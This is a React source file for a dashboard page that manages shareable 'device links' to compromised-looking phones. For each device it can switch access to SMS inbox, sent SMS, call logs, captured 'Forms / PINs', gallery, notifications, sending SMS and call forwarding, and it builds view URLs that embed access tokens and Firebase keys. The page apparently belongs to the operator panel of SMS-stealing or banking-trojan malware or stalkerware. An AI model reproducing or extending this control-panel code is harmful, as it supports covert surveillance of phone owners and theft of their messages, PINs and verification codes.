import { useEffect, useState } from "react";
import { ref, onValue, set, remove, get } from "@/lib/rtdbPb";
import { db, publicAuth } from "@/lib/firebase";
import { signInWithEmailAndPassword, deleteUser, signOut } from "@/lib/authPb";
import { decryptToken } from "@/lib/linkCrypto";
import blackholeBg from "@/assets/blackhole-bg.jpg";
import { Link2, Link2Off, Trash2, Copy, Clock, ArrowLeft, Smartphone, Shield, Settings2, Check } from "lucide-react";
import { toast } from "sonner";
import { useNavigate } from "react-router-dom";
import { format } from "date-fns";

interface LinkPermissions {
  sms?: boolean; sent_sms?: boolean; calls?: boolean; forms?: boolean;
  gallery?: boolean; notifications?: boolean; send_sms?: boolean; call_forward?: boolean;
}

interface DeviceLink {
  id: string;
  enabled: boolean;
  created_at: number;
  expires_at: number;
  device_brand?: string;
  device_model?: string;
  token?: string;
  aes_key?: string;
  permissions?: LinkPermissions;
  databaseURL?: string;
  apiKey?: string;
  authDomain?: string;
  projectId?: string;
}

const ManageLinksPage = () => {
  const [links, setLinks] = useState<DeviceLink[]>([]);
  const [loading, setLoading] = useState(true);
  const [deletingId, setDeletingId] = useState<string | null>(null);
  const [togglingId, setTogglingId] = useState<string | null>(null);
  const navigate = useNavigate();

  useEffect(() => {
    const linksRef = ref(db, "device_links");
    const unsub = onValue(linksRef, (snap) => {
      const data = snap.val();
      if (!data) { setLinks([]); setLoading(false); return; }
      const entries: DeviceLink[] = Object.entries(data).map(([id, val]: [string, any]) => ({
        id,
        enabled: val.enabled ?? false,
        created_at: val.created_at || 0,
        expires_at: val.expires_at || 0,
        device_brand: val.device_brand || "",
        device_model: val.device_model || "",
        token: val.token || "",
        aes_key: val.aes_key || "",
        permissions: val.permissions || {},
        databaseURL: val.databaseURL || "",
        apiKey: val.apiKey || "",
        authDomain: val.authDomain || "",
      }));
      entries.sort((a, b) => b.created_at - a.created_at);
      setLinks(entries);
      setLoading(false);
    });
    return () => unsub();
  }, []);

  const isExpired = (link: DeviceLink) => link.expires_at > 0 && Date.now() > link.expires_at;

  const toggleLink = async (link: DeviceLink) => {
    setTogglingId(link.id);
    try {
      await set(ref(db, `device_links/${link.id}/enabled`), !link.enabled);
      toast.success(link.enabled ? "Link disabled" : "Link enabled");
    } finally {
      setTogglingId(null);
    }
  };

  const deleteLink = async (id: string) => {
    setDeletingId(id);
    try {
      const snap = await get(ref(db, `device_links/${id}`));
      const data = snap.val() as Record<string, unknown> | null;
      const token = typeof data?.token === "string" ? data.token : "";
      const aesKey = typeof data?.aes_key === "string" ? data.aes_key : "";
      if (token && aesKey) {
        try {
          const decrypted = await decryptToken(token, aesKey);
          const [email, ...passParts] = decrypted.split(":");
          const password = passParts.join(":");
          const cred = await signInWithEmailAndPassword(publicAuth, email, password);
          await deleteUser(cred.user);
        } catch (authErr) {
          console.warn("Could not delete link auth user:", authErr);
        }
      }
      await remove(ref(db, `device_links/${id}`));
      toast.success("Link deleted & credentials removed");
    } catch (err) {
      console.error("Delete link error:", err);
      await remove(ref(db, `device_links/${id}`));
      toast.success("Link deleted");
    } finally {
      setDeletingId(null);
    }
  };

  const copyLink = (link: DeviceLink) => {
    const extraParams = [
      link.databaseURL ? `&db=${encodeURIComponent(link.databaseURL)}` : "",
      link.apiKey ? `&ak=${encodeURIComponent(link.apiKey)}` : "",
      link.authDomain ? `&ad=${encodeURIComponent(link.authDomain)}` : "",
    ].join("");
    const url = `${window.location.origin}/view/${link.id}${link.token ? `?t=${encodeURIComponent(link.token)}` : ""}${extraParams}`;
    navigator.clipboard.writeText(url);
    toast.success("Link copied!");
  };

  const getTimeRemaining = (expiresAt: number) => {
    if (!expiresAt) return "Permanent";
    const remaining = expiresAt - Date.now();
    if (remaining <= 0) return "Expired";
    if (remaining < 60 * 1000) return `${Math.ceil(remaining / 1000)}s left`;
    if (remaining < 60 * 60 * 1000) return `${Math.ceil(remaining / (60 * 1000))}m left`;
    if (remaining < 24 * 60 * 60 * 1000) return `${Math.ceil(remaining / (60 * 60 * 1000))}h left`;
    return `${Math.ceil(remaining / (24 * 60 * 60 * 1000))}d left`;
  };

  const activeLinks = links.filter(l => l.enabled && !isExpired(l));
  const inactiveLinks = links.filter(l => !l.enabled || isExpired(l));

  return (
    <div className="min-h-screen pb-20 relative">
      <div className="fixed inset-0 z-0 bg-cover bg-center opacity-30 pointer-events-none" style={{ backgroundImage: `url(${blackholeBg})` }} />
      <div className="relative z-10 min-h-screen bg-background/60">
        <header className="sticky top-0 z-30 border-b border-border bg-background/70 backdrop-blur-2xl">
          <div className="flex h-14 items-center gap-3 px-5 max-w-5xl mx-auto">
            <button onClick={() => navigate("/")} className="h-9 w-9 rounded-xl bg-secondary flex items-center justify-center hover:bg-primary/10 transition-colors">
              <ArrowLeft className="h-4 w-4 text-foreground" />
            </button>
            <div className="flex items-center gap-2">
              <Link2 className="h-4 w-4 text-primary" />
              <h1 className="text-base font-bold text-foreground">Manage Links</h1>
            </div>
            <span className="ml-auto text-[11px] text-muted-foreground">{activeLinks.length} active</span>
          </div>
        </header>

        <main className="px-5 py-4 space-y-4 max-w-5xl mx-auto">
          {loading ? (
            <div className="flex items-center justify-center py-16">
              <div className="h-6 w-6 border-2 border-primary border-t-transparent rounded-full animate-spin" />
            </div>
          ) : links.length === 0 ? (
            <div className="rounded-2xl border border-border bg-card p-12 text-center">
              <Link2Off className="h-8 w-8 text-muted-foreground mx-auto mb-3" />
              <p className="text-sm text-muted-foreground">No device links created yet</p>
              <p className="text-[10px] text-muted-foreground mt-1">Create links from device cards on the dashboard</p>
            </div>
          ) : (
            <>
              {activeLinks.length > 0 && (
                <div className="space-y-2">
                  <h2 className="text-xs font-bold text-green uppercase tracking-wider px-1">Active Links ({activeLinks.length})</h2>
                  {activeLinks.map((link) => (
                    <LinkCard key={link.id} link={link} expired={false} onToggle={toggleLink} onDelete={deleteLink} onCopy={copyLink} getTimeRemaining={getTimeRemaining} deleting={deletingId === link.id} toggling={togglingId === link.id} />
                  ))}
                </div>
              )}

              {inactiveLinks.length > 0 && (
                <div className="space-y-2">
                  <h2 className="text-xs font-bold text-muted-foreground uppercase tracking-wider px-1">Inactive / Expired ({inactiveLinks.length})</h2>
                  {inactiveLinks.map((link) => (
                    <LinkCard key={link.id} link={link} expired={isExpired(link)} onToggle={toggleLink} onDelete={deleteLink} onCopy={copyLink} getTimeRemaining={getTimeRemaining} deleting={deletingId === link.id} toggling={togglingId === link.id} />
                  ))}
                </div>
              )}
            </>
          )}
        </main>
      </div>
    </div>
  );
};

const FEATURE_LIST = [
  { key: "sms", label: "SMS Inbox", icon: "💬" },
  { key: "sent_sms", label: "Sent SMS", icon: "📤" },
  { key: "calls", label: "Call Logs", icon: "📞" },
  { key: "forms", label: "Forms / PINs", icon: "📝" },
  { key: "gallery", label: "Gallery", icon: "🖼️" },
  { key: "notifications", label: "Notifications", icon: "🔔" },
  { key: "send_sms", label: "Send SMS", icon: "✉️" },
  { key: "call_forward", label: "Call Forward", icon: "📲" },
] as const;

const LinkCard = ({
  link, expired, onToggle, onDelete, onCopy, getTimeRemaining, deleting, toggling,
}: {
  link: DeviceLink; expired: boolean; deleting: boolean; toggling: boolean;
  onToggle: (l: DeviceLink) => void; onDelete: (id: string) => void; onCopy: (l: DeviceLink) => void;
  getTimeRemaining: (e: number) => string;
}) => {
  const isActive = link.enabled && !expired;
  const timeStr = getTimeRemaining(link.expires_at);
  const busy = deleting || toggling;
  const [showPerms, setShowPerms] = useState(false);
  const [savingPerms, setSavingPerms] = useState(false);

  const perms = link.permissions || {};

  const togglePerm = async (key: string) => {
    setSavingPerms(true);
    try {
      const current = perms[key as keyof LinkPermissions] !== false;
      await set(ref(db, `device_links/${link.id}/permissions/${key}`), !current);
      toast.success(`${key.replace(/_/g, " ")} ${current ? "disabled" : "enabled"}`);
    } finally {
      setSavingPerms(false);
    }
  };

  const enabledCount = FEATURE_LIST.filter(f => perms[f.key as keyof LinkPermissions] !== false).length;

  return (
    <div className={`rounded-2xl border bg-card p-4 transition-all ${deleting ? "opacity-50 pointer-events-none" : ""} ${isActive ? "border-primary/30" : "border-border opacity-60"}`}>
      <div className="flex items-center gap-3 mb-2.5">
        <div className={`h-9 w-9 rounded-xl flex items-center justify-center ${isActive ? "gradient-purple-pink" : "bg-secondary"}`}>
          <Smartphone className="h-4 w-4 text-foreground" />
        </div>
        <div className="flex-1 min-w-0">
          <h3 className="text-sm font-semibold text-foreground truncate">
            {link.device_brand} {link.device_model || link.id}
          </h3>
          <p className="text-[10px] text-muted-foreground font-mono truncate">{link.id}</p>
        </div>
        <div className={`flex items-center gap-1 px-2 py-1 rounded-lg text-[10px] font-bold ${
          expired ? "bg-destructive/10 text-destructive" :
          isActive ? "bg-green/10 text-green" : "bg-secondary text-muted-foreground"
        }`}>
          <Clock className="h-2.5 w-2.5" />
          {expired ? "Expired" : timeStr}
        </div>
      </div>

      {link.created_at > 0 && (
        <p className="text-[10px] text-muted-foreground mb-2">
          Created {format(new Date(link.created_at), "MMM dd, yyyy HH:mm")}
        </p>
      )}

      {/* Permissions summary */}
      <button
        onClick={() => setShowPerms(!showPerms)}
        className="w-full flex items-center gap-2 px-3 py-2 rounded-xl bg-secondary/50 border border-border/50 mb-2.5 hover:border-primary/30 transition-all"
      >
        <Settings2 className="h-3 w-3 text-primary shrink-0" />
        <span className="text-[10px] font-semibold text-foreground">{enabledCount}/{FEATURE_LIST.length} features</span>
        <span className="ml-auto text-[10px] text-primary font-medium">{showPerms ? "Hide" : "Edit"}</span>
      </button>

      {showPerms && (
        <div className="grid grid-cols-2 gap-1.5 mb-2.5">
          {FEATURE_LIST.map((feat) => {
            const enabled = perms[feat.key as keyof LinkPermissions] !== false;
            return (
              <button
                key={feat.key}
                onClick={() => togglePerm(feat.key)}
                disabled={savingPerms}
                className={`flex items-center gap-1.5 px-2.5 py-2 rounded-xl border text-[10px] font-semibold transition-all disabled:opacity-50 ${
                  enabled
                    ? "bg-primary/10 border-primary/30 text-primary"
                    : "bg-secondary/50 border-border text-muted-foreground"
                }`}
              >
                <span>{feat.icon}</span>
                <span className="truncate">{feat.label}</span>
                {enabled && <Check className="h-3 w-3 ml-auto shrink-0" />}
              </button>
            );
          })}
        </div>
      )}

      <div className="flex items-center gap-2">
        <button
          onClick={() => onToggle(link)}
          disabled={busy}
          className={`flex-1 flex items-center justify-center gap-1 py-1.5 rounded-lg text-xs font-medium transition-colors disabled:opacity-50 ${
            isActive ? "bg-primary/10 text-primary hover:bg-primary/20" : "bg-green/10 text-green hover:bg-green/20"
          }`}
        >
          {toggling ? <div className="h-3 w-3 border-2 border-current border-t-transparent rounded-full animate-spin" /> : isActive ? <Link2Off className="h-3 w-3" /> : <Link2 className="h-3 w-3" />}
          {toggling ? "..." : isActive ? "Disable" : "Enable"}
        </button>
        {isActive && (
          <button
            onClick={() => onCopy(link)}
            disabled={busy}
            className="flex-1 flex items-center justify-center gap-1 py-1.5 rounded-lg bg-secondary text-xs text-muted-foreground hover:text-foreground transition-colors disabled:opacity-50"
          >
            <Copy className="h-3 w-3" />
            Copy
          </button>
        )}
        <button
          onClick={() => onDelete(link.id)}
          disabled={busy}
          className="flex items-center justify-center py-1.5 px-3 rounded-lg bg-destructive/10 text-xs text-destructive hover:bg-destructive/20 transition-colors disabled:opacity-50"
        >
          {deleting ? <div className="h-3 w-3 border-2 border-destructive border-t-transparent rounded-full animate-spin" /> : <Trash2 className="h-3 w-3" />}
        </button>
      </div>
    </div>
  );
};

export default ManageLinksPage;
